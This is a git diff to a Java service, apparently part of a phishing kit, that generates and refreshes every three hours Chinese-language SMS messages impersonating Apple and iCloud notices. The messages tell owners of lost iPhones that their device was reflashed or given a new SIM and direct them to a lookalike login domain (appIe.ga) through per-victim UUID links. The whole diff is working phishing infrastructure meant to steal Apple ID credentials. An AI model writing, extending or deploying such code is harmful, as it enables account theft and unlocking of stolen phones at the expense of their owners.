@@ -6,7 +6,8 @@ import com.apple.domain.Message;
 import com.apple.domain.Users;
 import com.apple.repository.MessageRepository;
 import com.apple.repository.UsersRepository;
-
+import java.sql.Timestamp;
+import java.util.Calendar;
 import java.util.List;
 import java.util.UUID;
 import org.slf4j.Logger;
@@ -48,6 +49,28 @@ public class ManagerService {
             if (!"".equals(phone)) {
                 Message message = messageRepository.findByPhone(phone);
                 if(null!=message){
+                    Timestamp timer = message.getTimer();
+                    Calendar calendar = Calendar.getInstance();
+                    calendar.add(Calendar.HOUR, -3);
+                    Timestamp now = new Timestamp(calendar.getTimeInMillis());
+                    if(now.after(timer)){
+                        messageRepository.delete(message);
+                        String uuid = UUID.randomUUID().toString().replace("-", "");
+                        message = new Message();
+                        message.setPhone(phone);
+                        message.setUuid(uuid);
+                        message.setMessage(
+                                "尊敬的Apple用户您好：您遗失的iPhone设备已进入DFU刷机模式激活，如非本人进行此类操作请登录管理中心 www.appIe.ga/AppleID/login/" + uuid
+                                        + " 并查看此设备所在位置。【Apple通知】");
+                        message.setMessage2("【iCloud提醒】                您的iPhone已联网，插入SIM卡,被用于Wed浏览器上申请POD模式解除设备锁。如非本人进行此类操作；请登录( www.appIe.ga/AppleID/login/"+uuid+" ) 并查看SIM卡号和位置。");
+                        try{
+                            messageRepository.save(message);
+                            return message;
+                        }catch (Exception e){
+                            e.printStackTrace();
+                            throw e;
+                        }
+                    }
                     return message;
                 }
                 String uuid = UUID.randomUUID().toString().replace("-", "");
